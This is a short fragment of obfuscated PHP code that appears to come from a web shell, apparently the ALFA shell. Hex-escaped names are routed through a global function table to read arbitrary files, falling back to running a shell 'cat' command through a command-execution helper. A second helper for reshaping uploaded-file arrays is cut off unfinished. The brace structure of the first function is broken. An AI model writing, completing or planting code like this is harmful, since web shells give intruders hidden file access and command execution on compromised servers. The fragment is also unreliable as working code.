function __read_file($file, $boom = true){
$content = false;
if($fh = @$GLOBALS['F']["\x66\x6f\x70\x65\x6e"]($file, "\x72\x62")){

$content .= $boom ? $GLOBALS['F']["\x63\x6c\x65\x61\x6e\x5f\x73\x74\x72\x69\x6e\x67"]($GLOBALS['F']["\x66\x72\x65\x61\x64"]($fh, 8192)) : $GLOBALS['F']["\x66\x72\x65\x61\x64"]($fh, 8192);
}
@$GLOBALS['F']["\x66\x63\x6c\x6f\x73\x65"]($fh);
}
if(empty($content)||!$content){ $content = $GLOBALS['F']["\x61\x6c\x66\x61\x45\x78"]("\x63\x61\x74\x20\x27".$GLOBALS['F']["\x61\x64\x64\x73\x6c\x61\x73\x68\x65\x73"]($file)."\x27");
}
return $content;
}

function reArrayFiles($file_post){
$file_ary = array();
$file_count = $GLOBALS['F']["\x63\x6f\x75\x6e\x74"]($file_post["\x6e\x61\x6d\x65"]);
$file_keys = $GLOBALS['F']["\x61\x72\x72\x61\x79\x5f\x6b\x65\x79\x73"]($file_post);
for ($i=0; $i<$file_count; $i++) {
foreach ($file_keys as $key) {
$file_ary[$i][$key] = $file_post[$key][$i];
}
}
